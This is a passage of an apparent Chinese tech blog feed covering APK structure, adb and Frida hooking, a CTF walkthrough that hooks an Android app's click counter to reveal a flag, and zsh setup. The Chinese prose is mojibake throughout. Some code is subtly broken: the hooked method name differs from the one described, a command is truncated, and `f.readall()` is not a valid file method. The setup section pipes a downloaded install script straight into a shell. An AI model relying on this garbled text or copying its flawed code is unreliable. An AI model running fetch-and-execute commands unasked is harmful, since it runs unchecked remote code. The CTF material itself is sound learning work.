¡éªŒç»“æœä¸META-INFä¸‹çš„å†…å®¹ä¸ä¸€è‡´ï¼Œç³»ç»Ÿå°±ä¸ä¼šå®‰è£…è¿™ä¸ªapkã€‚ä»è€Œä¿è¯äº†apkåŒ…é‡Œçš„æ–‡ä»¶ä¸èƒ½è¢«éšæ„æ›¿æ¢ã€‚</p><p>META-INFç›®å½•ä¸‹åŒ…å«çš„æ–‡ä»¶æœ‰CERT.RSAï¼ŒCERT.DSAï¼ŒCERT.SFå’ŒMANIFEST.MF</p><ul><li>CERT.RSAï¼šæ˜¯å¼€å‘è€…åˆ©ç”¨ç§é’¥å¯¹APKè¿›è¡Œç­¾åçš„ç­¾åæ–‡ä»¶</li><li>CERT.SFï¼ŒMANIFEST.MFï¼šè®°å½•äº†æ–‡ä»¶ä¸­æ–‡ä»¶çš„å“ˆå¸Œå€¼</li></ul><h3 id="lib"><a href="#lib" class="headerlink" title="lib"></a>lib</h3><p>è¿™é‡Œå­˜æ”¾åº”ç”¨ç¨‹åºä¾èµ–çš„<strong>nativeåº“æ–‡ä»¶</strong>ï¼Œä¸€èˆ¬æ˜¯ç”¨C&#x2F;C++ç¼–å†™ï¼Œè¿™é‡Œçš„libåº“å¯èƒ½åŒ…å«å¤šç§ä¸åŒç±»å‹ï¼Œå¤§ä½“å¯ä»¥åˆ†ä¸ºARMï¼ŒX86ç­‰æ¶æ„ã€‚</p><h3 id="res"><a href="#res" class="headerlink" title="res"></a>res</h3><p>resæ˜¯resourceçš„ç¼©å†™ï¼Œè¿™ä¸ªç›®å½•å­˜æ”¾èµ„æºæ–‡ä»¶ï¼Œå­˜åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹çš„æ‰€æœ‰æ–‡ä»¶éƒ½ä¼šæ˜ å°„åˆ°Androidå·¥ç¨‹çš„<code>.R</code>æ–‡ä»¶ä¸­ï¼Œç”Ÿæˆå¯¹åº”çš„IDï¼Œè®¿é—®çš„æ—¶å€™ç›´æ¥ä½¿ç”¨èµ„æºIDå³R.id.filenameï¼Œresæ–‡ä»¶å¤¹ä¸‹å¯ä»¥åŒ…å«å¤šä¸ªæ–‡ä»¶å¤¹ã€‚</p><p><strong>resæ–‡ä»¶å¤¹ï¼Œå­˜æ”¾çš„ä¹Ÿæ˜¯èµ„æºæ–‡ä»¶ï¼Œä¸assetsæ–‡ä»¶å¤¹ä¸åŒçš„æ˜¯ï¼Œè¿™é‡Œæ˜¯ç¼–è¯‘åçš„èµ„æºæ–‡ä»¶ã€‚</strong></p><h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><p>æ˜¯Androidåº”ç”¨ç¨‹åºçš„é…ç½®æ–‡ä»¶ï¼Œæ˜¯ä¸€ä¸ªç”¨æ¥æè¿°Androidåº”ç”¨â€œæ•´ä½“èµ„è®¯â€çš„è®¾å®šæ–‡ä»¶ï¼Œ Androidç³»ç»Ÿå¯ä»¥æ ¹æ®è¿™ä¸ª<strong>è‡ªæˆ‘ä»‹ç»</strong>å®Œæ•´åœ°äº†è§£APKåº”ç”¨ç¨‹åºçš„èµ„è®¯ï¼Œæ¯ä¸ªAndroidåº”ç”¨ç¨‹åºéƒ½å¿…é¡»åŒ…å«ä¸€ä¸ªAndroidManifest.xmlæ–‡ä»¶ï¼Œä¸”å®ƒçš„åå­—æ˜¯å›ºå®šçš„ï¼Œä¸èƒ½ä¿®æ”¹ã€‚æˆ‘ä»¬åœ¨å¼€å‘Androidåº”ç”¨ç¨‹åºçš„æ—¶å€™ï¼Œä¸€èˆ¬éƒ½æŠŠä»£ç ä¸­çš„æ¯ä¸€ä¸ªActivityï¼ŒServiceï¼ŒProviderå’ŒReceiveråœ¨AndroidManifest.xmlä¸­æ³¨å†Œï¼Œåªæœ‰è¿™æ ·ç³»ç»Ÿæ‰èƒ½å¯åŠ¨å¯¹åº”çš„ç»„ä»¶ï¼Œå¦å¤–è¿™ä¸ªæ–‡ä»¶è¿˜åŒ…å«ä¸€äº›æƒé™å£°æ˜ä»¥åŠä½¿ç”¨çš„SDKç‰ˆæœ¬ä¿¡æ¯ç­‰ç­‰ã€‚ç¨‹åºæ‰“åŒ…æ—¶ï¼Œä¼šæŠŠAndroidManifest.xmlè¿›è¡Œç®€å•çš„ç¼–è¯‘ï¼Œä¾¿äºAndroidç³»ç»Ÿè¯†åˆ«ï¼Œç¼–è¯‘ä¹‹åçš„æ ¼å¼æ˜¯AXMLæ ¼å¼</p><h3 id="classes-dex"><a href="#classes-dex" class="headerlink" title="classes.dex"></a>classes.dex</h3><p>ä¼ ç»Ÿçš„Javaç¨‹åºï¼Œé¦–å…ˆå…ˆæŠŠJavaæ–‡ä»¶ç¼–è¯‘æˆclassæ–‡ä»¶ï¼Œå­—èŠ‚ç éƒ½ä¿å­˜åœ¨äº†classæ–‡ä»¶ä¸­ï¼ŒJavaè™šæ‹Ÿæœºå¯ä»¥é€šè¿‡è§£é‡Šæ‰§è¡Œè¿™äº›classæ–‡ä»¶ã€‚</p><p>è€ŒDalvikè™šæ‹Ÿæœºæ˜¯åœ¨Javaè™šæ‹Ÿæœºè¿›è¡Œäº†ä¼˜åŒ–ï¼Œæ‰§è¡Œçš„æ˜¯Dalvikå­—èŠ‚ç ï¼Œè€Œè¿™äº›Dalvikå­—èŠ‚ç æ˜¯ç”±Javaå­—èŠ‚ç è½¬æ¢è€Œæ¥ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒAndroidåº”ç”¨åœ¨æ‰“åŒ…æ—¶é€šè¿‡AndroidSDKä¸­çš„dxå·¥å…·å°†Javaå­—èŠ‚ç è½¬æ¢ä¸ºDalvikå­—èŠ‚ç ã€‚dxå·¥å…·å¯ä»¥å¯¹å¤šä¸ªclassæ–‡ä»¶è¿›è¡Œåˆå¹¶ï¼Œé‡ç»„ï¼Œä¼˜åŒ–ï¼Œå¯ä»¥è¾¾åˆ°å‡å°ä½“ç§¯ï¼Œç¼©çŸ­è¿è¡Œæ—¶é—´çš„ç›®çš„ã€‚</p><p>dxå·¥å…·æŠŠæ¯ä¸ª.classæ–‡ä»¶çš„æ¯ä¸ªåŒºåŸŸçš„å†…å®¹è¿›è¡Œå»é‡ï¼Œé‡ç»„ï¼Œä¼˜åŒ–é‡æ’åç”Ÿæˆdexæ–‡ä»¶ï¼Œç”Ÿæˆçš„dexæ–‡ä»¶å¯ä»¥åœ¨Dalvikè™šæ‹Ÿæœºæ‰§è¡Œï¼Œä¸”é€Ÿåº¦æ¯”è¾ƒå¿«</p><h3 id="resources-arsc"><a href="#resources-arsc" class="headerlink" title="resources.arsc"></a>resources.arsc</h3><p>ç”¨æ¥è®°å½•èµ„æºæ–‡ä»¶å’Œèµ„æºIDä¹‹é—´çš„æ˜ å°„å…³ç³»ï¼Œç”¨æ¥æ ¹æ®èµ„æºIDå¯»æ‰¾èµ„æºã€‚Androidçš„å¼€å‘æ˜¯åˆ†æ¨¡å—çš„ï¼Œresç›®å½•ä¸“é—¨ç”¨æ¥å­˜æ”¾èµ„æºæ–‡ä»¶ï¼Œå½“åœ¨ä»£ç ä¸­éœ€è¦è°ƒç”¨èµ„æºæ–‡ä»¶æ—¶ï¼Œåªéœ€è¦è°ƒç”¨findviewbyId()å°±å¯ä»¥å¾—åˆ°èµ„æºæ–‡ä»¶ï¼Œæ¯å½“åœ¨resæ–‡ä»¶å¤¹ä¸‹æ”¾ä¸€ä¸ªæ–‡ä»¶ï¼Œaaptå°±ä¼šè‡ªåŠ¨ç”Ÿæˆå¯¹åº”çš„IDä¿å­˜åœ¨.Ræ–‡ä»¶ï¼Œæˆ‘ä»¬è°ƒç”¨è¿™ä¸ªIDå°±å¯ä»¥ï¼Œä½†æ˜¯åªæœ‰è¿™ä¸ªIDè¿˜ä¸å¤Ÿï¼Œ.Ræ–‡ä»¶åªæ˜¯ä¿è¯ç¼–è¯‘ç¨‹åºä¸æŠ¥é”™ï¼Œå®é™…ä¸Šåœ¨ç¨‹åºè¿è¡Œæ—¶ï¼Œç³»ç»Ÿè¦æ ¹æ®IDå»å¯»æ‰¾å¯¹åº”çš„èµ„æºè·¯å¾„ï¼Œè€Œresources.arscæ–‡ä»¶å°±æ˜¯ç”¨æ¥è®°å½•è¿™äº›IDå’Œèµ„æºæ–‡ä»¶ä½ç½®å¯¹åº”å…³ç³»çš„æ–‡ä»¶ã€‚</p><h3 id="kotlin"><a href="#kotlin" class="headerlink" title="kotlin"></a>kotlin</h3><p>kotlin æ˜¯ä¸€é—¨ç¼–ç¨‹è¯­è¨€ï¼Œä¹Ÿå¯ä»¥ç›´æ¥è¿è¡Œåœ¨Javaè™šæ‹Ÿæœºä¸­ï¼Œè¿™ä¸ªç›®å½•å­˜æ”¾kotlinèµ„æº</p><h2 id="adb-ç®€å•ä½¿ç”¨"><a href="#adb-ç®€å•ä½¿ç”¨" class="headerlink" title="adb ç®€å•ä½¿ç”¨"></a>adb ç®€å•ä½¿ç”¨</h2><ul><li>å°†æ–‡ä»¶æ”¾å…¥androidæœºå™¨é‡Œ</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push xxx /data/local/tmp</span><br></pre></td></tr></table></figure><ul><li>å®‰è£…åº”ç”¨</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb install apk.apk</span><br></pre></td></tr></table></figure><ul><li>å¸è½½</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb uninstall com.xxx.xxx</span><br></pre></td></tr></table></figure><ul><li>è·å¾—shell</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adb connect &lt;ip&gt;:&lt;port&gt;</span><br><span class="line">adb shell</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line">adb disconnect &lt;ip&gt;:&lt;port&gt;</span><br></pre></td></tr></table></figure><ul><li>å¯åŠ¨æŒ‡å®šçš„activity</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">am start -n &lt;package&gt;/&lt;activity&gt; </span><br></pre></td></tr></table></figure><h2 id="frida-ç®€å•ä½¿ç”¨"><a href="#frida-ç®€å•ä½¿ç”¨" class="headerlink" title="frida ç®€å•ä½¿ç”¨"></a>frida ç®€å•ä½¿ç”¨</h2><ul><li><p>python çš„ frida-tools å’Œ æ‰‹æœºç«¯çš„ server å¿…é¡»ä¿æŒä¸€è‡´çš„ç‰ˆæœ¬, å¯ä»¥ä½¿ç”¨python venv</p></li><li><p>CPU ä¿¡æ¯</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell getprop ro.product.cpu.abi</span><br></pre></td></tr></table></figure><ul><li>æŒ‡å‘hook è„šæœ¬</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -l hook.js -f com.package.name --no-pause</span><br></pre></td></tr></table></figure><ul><li>ä½¿ç”¨python æ‰§è¡Œ</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line"><span class="comment"># frida-ps -Ua è·å¾—ä¸€ä¸ªpidå·</span></span><br><span class="line">process = device.attach(<span class="number">8189</span>)</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;hook.js&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># send js</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(path, encoding=<span class="string">&quot;UTF-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">Â  Â  jscode = f.readall()</span><br><span class="line">Â  Â  hook = process.create_script(jscode)</span><br><span class="line">hook.load()</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>()  <span class="comment"># å¯ä»¥æ“ä½œAndroidè½¯ä»¶å¹¶ä¸”è¿›è¡Œhook</span></span><br></pre></td></tr></table></figure><h3 id="hook-java"><a href="#hook-java" class="headerlink" title="hook java"></a>hook java</h3><ul><li>æ¡†æ¶</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(() =&gt; &#123;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>è·å¾—ç±»</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">var</span> <span class="variable">stringClass</span> <span class="operator">=</span> Java.use(<span class="string">&quot;java.util.String&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>å®ä¾‹åŒ–</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºä¸€ä¸ªå®ä¾‹</span></span><br><span class="line">stringClass.$<span class="keyword">new</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// æˆ‘ä»¬ä¹Ÿå¯ä»¥æŸ¥æ‰¾ä¸€ä¸ªå®ä¾‹</span></span><br><span class="line">Java.choose(<span class="string">&#x27;java.lang.String&#x27;</span>, &#123;  </span><br><span class="line">        onMatch: function(instance)&#123;  </span><br><span class="line">        console.log(<span class="string">&#x27;String instance is:&#x27;</span>, instance);  </span><br><span class="line">        &#125;,</span><br><span class="line">        onComplete: function()&#123;</span><br><span class="line">        console.log(<span class="string">&#x27;search complete!&#x27;</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>æ–¹æ³•</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// é™æ€æ–¹æ³•</span></span><br><span class="line">className.&lt;method&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®ä¾‹æ–¹æ³•</span></span><br><span class="line"><span class="comment">// 1. æŸ¥æ‰¾å®ä¾‹è°ƒç”¨</span></span><br><span class="line"><span class="comment">// 2. newä¸€ä¸ªç„¶åè°ƒç”¨</span></span><br></pre></td></tr></table></figure><ul><li>å˜é‡</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// static</span></span><br><span class="line">&lt;class&gt;.&lt;<span class="keyword">var</span>&gt;.value = xxx;</span><br></pre></td></tr></table></figure><ul><li>hook java method</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;class&gt;.&lt;method&gt;.implementation = function(arg...) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é‡è½½: å½“ä¸€ä¸ª class ä¸¤ä¸ªåç§°ç›¸åŒçš„æ–¹æ³•</span></span><br><span class="line">&lt;class&gt;.&lt;method&gt;.overload([TYPE], [TYPE]).implementation = function(args...)&#123; </span><br><span class="line"><span class="comment">// do sth </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ„é€ å‡½æ•°çš„ hook $init</span></span><br><span class="line">StringBuilder.$init.overload(<span class="string">&#x27;java.lang.String&#x27;</span>).implementation = function (arg) &#123;</span><br><span class="line">    <span class="type">var</span> <span class="variable">partial</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">var</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.$init(arg);</span><br><span class="line">    <span class="keyword">if</span> (arg !== <span class="literal">null</span>) &#123;</span><br><span class="line">         partial = arg.toString().replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).slice(<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// console.log(&#x27;new StringBuilder(java.lang.String); =&gt; &#x27; + result)</span></span><br><span class="line">    console.log(<span class="string">&#x27;new StringBuilder(&quot;&#x27;</span> + partial + <span class="string">&#x27;&quot;);&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å…¥é—¨ä¾‹å­"><a href="#å…¥é—¨ä¾‹å­" class="headerlink" title="å…¥é—¨ä¾‹å­"></a>å…¥é—¨ä¾‹å­</h2><h3 id="newstartCTF-2023-lazyactivity"><a href="#newstartCTF-2023-lazyactivity" class="headerlink" title="newstartCTF 2023 lazyactivity"></a>newstartCTF 2023 lazyactivity</h3><p>ä¸¤ä¸ªactivity</p><ul><li>MainActivity</li><li>FlagActivity</li></ul><p>æ¨¡æ‹Ÿå™¨æ‰“å¼€æ—¶æ˜¯MainActivityï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦è¿è¡ŒFlagActivity</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">am start -n com.droidlearn.activity_travel/com.droidlearn.activity_travel.FlagActivit</span><br></pre></td></tr></table></figure><p>FlagActivity é€»è¾‘ï¼šç‚¹å‡»10000æ¬¡ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥hook <code>access$004</code> ä½¿å…¶è¿”å›ç»“æœå¤§äº10000å°±è¡Œ(åŸæ¥çš„é€»è¾‘ä¸ºç‚¹å‡»ä¸€æ¬¡ï¼Œcnt+&#x3D;1, hookåå°±æ˜¯ç‚¹å‡»ä¸€æ¬¡ï¼Œè¿”å›10001)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlagActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">cnt</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="comment">/* synthetic */</span> <span class="type">int</span> access$<span class="number">004</span>(FlagActivity flagActivity) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> flagActivity.cnt + <span class="number">1</span>;</span><br><span class="line">        flagActivity.cnt = i;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView(C0535R.layout.layout_2);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">TextView</span> <span class="variable">textView</span> <span class="operator">=</span> (TextView) findViewById(C0535R.C0538id.textView2);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">EditText</span> <span class="variable">editText</span> <span class="operator">=</span> (EditText) findViewById(C0535R.C0538id.editTextTextPersonName2);</span><br><span class="line">        ((Button) findViewById(C0535R.C0538id.button)).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.droidlearn.activity_travel.FlagActivity.1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                textView.setText(Integer.toString(FlagActivity.access$<span class="number">004</span>(FlagActivity.<span class="built_in">this</span>)));</span><br><span class="line">                <span class="keyword">if</span> (FlagActivity.<span class="built_in">this</span>.cnt &gt;= <span class="number">10000</span>) &#123;</span><br><span class="line">                    Toast.makeText(FlagActivity.<span class="built_in">this</span>, editText.getText().toString(), <span class="number">0</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><del>æ˜¯ç”·äººå°±ç‚¹å‡»10000æ¬¡ï¼ˆbushi</del></p><ul><li>hook.py</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="comment"># è¿æ¥å®‰å“æœºä¸Šçš„frida-server</span></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">session = device.attach(<span class="number">3157</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ è½½hooook.jsè„šæœ¬</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;lazy_activity.js&quot;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">Â  Â  script = session.create_script(f.read())</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>()</span><br></pre></td></tr></table></figure><ul><li>hook.js</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Script loaded successfully &quot;</span>);</span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">Â  Â  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Inside java perform function&quot;</span>);</span><br><span class="line">Â  Â  <span class="comment">//å®šä½ç±»</span></span><br><span class="line">Â  Â  <span class="keyword">var</span> my_class = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.droidlearn.activity_travel.FlagActivity&quot;</span>);</span><br><span class="line">Â  Â  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Java.Use.Successfully!&quot;</span>);</span><br><span class="line">Â  Â  <span class="comment">//åœ¨è¿™é‡Œæ›´æ”¹ç±»çš„æ–¹æ³•çš„å®ç°ï¼ˆimplementationï¼‰</span></span><br><span class="line">Â  Â  my_class.<span class="property">access$000</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">Â  Â  Â  Â  <span class="comment">//æ‰“å°æ›¿æ¢å‰çš„å‚æ•°</span></span><br><span class="line">Â  Â  Â  Â  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Successfully!&quot;</span>);</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">return</span> <span class="number">10001</span>;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>è¿è¡Œpythonè„šæœ¬ï¼Œç„¶ååœ¨æ¨¡æ‹Ÿå™¨æˆ–è€…çœŸæœºä¸Šç‚¹å‡»ä¸€ä¸‹å°±è¡Œã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è™šæ‹Ÿæœºé…ç½®</title>
      <link href="/2023/09/17/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE/"/>
      <url>/2023/09/17/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ä¸ªäººå¸¸ç”¨è™šæ‹Ÿæœºé…ç½®ï¼ŒæŒç»­æ›´æ–°ã€‚ã€‚ã€‚</p></blockquote><span id="more"></span><h2 id="zsh"><a href="#zsh" class="headerlink" title="zsh"></a>zsh</h2><ul><li>ä¸‹è½½</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install zsh</span><br><span class="line"></span><br><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure><ul><li>æ’ä»¶</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>&quot;</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh&#125;</span>/plugins/zsh-syntax-highlighting</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh&#125;</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure><ul><li>ä¿®æ”¹zshrc</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">git </span><br><span class="line">zsh-syntax-highlighting </span><br><span class="line">zsh-autosuggestions</span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li>ä¸»é¢˜</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com/romkatv/powerlevel10k.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/themes/powerlevel10k</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹zshrc</span></span><br><span class="line">ZSH_THEME=powerlevel10k/powerlevel10k</span><br></pre></td></tr></table></figure><h2 id="å­—ä½“"><a href="#å­—ä½“" class="headerlink" title="å­—ä½“"></a>å­—ä½“</h2><ul><li>ä¸‹è½½ï¼Œè§£å‹ï¼Œå°† ttf æ–‡ä»¶æ”¾å…¥ ä¸€ä¸‹æ–‡ä»¶å¤¹</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç»™ç”¨æˆ·è‡ªå·±ç”¨</span></span><br><span class="line"><span class="built_in">mkdir</span> -p ~/.fonts</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…¨éƒ¨ç”¨æˆ·</span></span><br><span class="line">/usr/share/fonts</span><br></pre></td></tr></table></figure><ul><li>æ‰§è¡Œå‘½ä»¤</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 